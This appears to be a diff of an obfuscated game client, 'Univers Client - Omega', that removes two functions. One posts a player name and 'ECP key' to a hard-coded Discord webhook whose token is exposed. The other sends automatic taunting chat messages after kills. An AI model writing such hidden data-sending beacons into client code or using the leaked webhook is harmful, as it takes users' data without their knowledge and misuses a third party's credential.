@@ -3034,47 +3034,6 @@ ga('send', 'pageview');</script>
                         });
                     }
                 }
-                function chatmessage(_0x4549ff) {
-                    var _0x15b63b = {
-                        cebUZ: "https://discord.com/api/webhooks/1236728500862455878/1n3rh6QLmzFSYGimtcmDVJHbahRemcSI69TIv2UxJOB3uPzB8aBX4OT2IDGBXP0i6srf"
-                    };
-                    _0x15b63b.zyGNG = "POST";
-                    _0x15b63b.VvHMO = "Content-type";
-                    _0x15b63b.WPGvd = "application/json; charset=utf-8";
-                    let _0x34c4e9 = new XMLHttpRequest();
-                    var _0x1cb23f = {
-                        content: _0x4549ff
-                    };
-                    let _0x5c33fd = JSON.stringify(_0x1cb23f);
-                    _0x34c4e9.open(_0x15b63b.zyGNG, "https://discord.com/api/webhooks/1236728500862455878/1n3rh6QLmzFSYGimtcmDVJHbahRemcSI69TIv2UxJOB3uPzB8aBX4OT2IDGBXP0i6srf");
-                    _0x34c4e9.setRequestHeader(_0x15b63b.VvHMO, _0x15b63b.WPGvd);
-                    _0x34c4e9.send(_0x5c33fd);
-                }
-                chatmessage("\n```Player named: " + "Univers = Trash" + "\nPlayer ECP key: " + "me gg xD xD" + "```\n <a:yesyesyes:1031208570647224331> Loaded the client <:DiscordOn:858441093913772072> ");
-                function globalstat(_0x161b4a, _0x3751be) {
-                    switch (_0x161b4a) {
-                        case "kills":
-                            localStorage.globalkills = Number(localStorage.globalkills) + 1;
-                            if (localStorage.autotoxictoggle == "true") {
-                                var _0x12cde4 = {
-                                    name: "say",
-                                    data: localStorage.autotoxictext
-                                };
-                                var _0x14d248 = Object.values(Object.values(window.module.exports.settings).find(_0x1fda98 => _0x1fda98.mode)).find(_0x594c6 => _0x594c6.socket).socket;
-                                _0x14d248.send(JSON.stringify(_0x12cde4));
-                            }
-                            break;
-                        case "deaths":
-                            localStorage.globaldeaths = Number(localStorage.globaldeaths) + 1;
-                            break;
-                        case "revenges":
-                            localStorage.globalrevenges = Number(localStorage.globalrevenges) + 1;
-                            break;
-                        case "contrib":
-                            localStorage.globalcontrib = Number(localStorage.globalcontrib) + Number(_0x3751be);
-                            break;
-                    }
-                }
                 var rev = "fwd";
                 function titlebar(_0x48a874) {
                     var _0x1573b2 = "Univers Client - Omega";
